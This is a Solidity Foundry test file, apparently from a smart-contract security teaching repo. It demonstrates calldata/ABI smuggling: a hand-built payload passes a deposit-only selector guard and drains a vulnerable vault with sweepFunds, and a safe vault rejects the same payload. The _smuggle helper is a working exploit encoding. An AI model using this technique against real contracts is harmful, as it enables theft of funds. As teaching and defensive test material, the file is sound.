// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableSelfAuthVault, SafeSelfAuthVault} from "../src/calldata/AbiSmuggling.sol";

/// PoC for calldata / ABI smuggling.
///   forge test --match-contract CalldataAbiSmuggling -vvv
///
/// Invariant (SC05): the function the guard authorizes must be the function that executes. The
/// vulnerable vault reads the selector from a fixed calldata offset while forwarding a dynamic
/// `bytes` whose offset the attacker controls — so an allowed selector passes the check while
/// `sweepFunds` runs. The safe vault reads the selector from the bytes it actually forwards.
///
/// See docs/exploits/calldata-abi-smuggling.md
contract CalldataAbiSmugglingTest is Test {
    address attacker = makeAddr("attacker");
    bytes4 constant EXECUTE = bytes4(keccak256("execute(bytes)"));
    bytes4 constant DEPOSIT = bytes4(keccak256("deposit()"));

    /// Hand-craft `execute(bytes)` calldata that parks DEPOSIT at the checked offset (0x44) while
    /// the real `actionData` (resolved via a non-canonical offset of 0x80) is sweepFunds(attacker).
    function _smuggle(address to) internal pure returns (bytes memory) {
        bytes memory action = abi.encodeWithSignature("sweepFunds(address)", to); // 36 bytes
        return abi.encodePacked(
            EXECUTE, // 0x00  execute selector
            uint256(0x80), // 0x04  ABI offset to actionData (non-canonical: content lands at 0x84)
            uint256(0), // 0x24  padding
            DEPOSIT, // 0x44  <-- guard reads here: the ALLOWED selector
            bytes28(0), //        (fill the rest of the 0x44 word)
            uint256(0), // 0x64  padding
            uint256(action.length), // 0x84  actionData length (36)
            action // 0xA4  actionData content: sweepFunds(attacker)
        );
    }

    function test_vulnerable_smuggleSweepPastDepositGuard() public {
        VulnerableSelfAuthVault vault = new VulnerableSelfAuthVault{value: 10 ether}();
        assertEq(address(vault).balance, 10 ether);

        vm.prank(attacker);
        (bool ok,) = address(vault).call(_smuggle(attacker));
        assertTrue(ok, "smuggled call should succeed");

        assertEq(address(vault).balance, 0, "vault drained");
        assertEq(attacker.balance, 10 ether, "attacker swept the funds via a deposit-looking call");
    }

    function test_vulnerable_honestDepositStillWorks() public {
        VulnerableSelfAuthVault vault = new VulnerableSelfAuthVault{value: 1 ether}();
        // Canonical encoding of execute(deposit()) — the guard and the forwarded bytes agree.
        bytes memory honest = abi.encodeWithSelector(EXECUTE, abi.encodeWithSignature("deposit()"));
        (bool ok,) = address(vault).call(honest);
        assertTrue(ok, "honest deposit path works");
        assertEq(address(vault).balance, 1 ether);
    }

    function test_safe_smuggleRejected() public {
        SafeSelfAuthVault vault = new SafeSelfAuthVault{value: 10 ether}();

        // Same smuggled payload, but the safe vault validates actionData[:4] == sweepFunds → reject.
        bytes memory action = abi.encodeWithSignature("sweepFunds(address)", attacker);
        bytes memory payload = abi.encodePacked(
            EXECUTE, uint256(0x80), uint256(0), DEPOSIT, bytes28(0), uint256(0), uint256(action.length), action
        );
        vm.prank(attacker);
        (bool ok, bytes memory ret) = address(vault).call(payload);
        assertFalse(ok, "safe vault rejects the smuggled selector");
        assertEq(address(vault).balance, 10 ether, "funds untouched");
        ret; // silence
    }

    function test_safe_honestDepositWorks() public {
        SafeSelfAuthVault vault = new SafeSelfAuthVault{value: 1 ether}();
        bytes memory honest = abi.encodeWithSelector(EXECUTE, abi.encodeWithSignature("deposit()"));
        (bool ok,) = address(vault).call(honest);
        assertTrue(ok, "honest deposit path works on safe vault");
    }
}
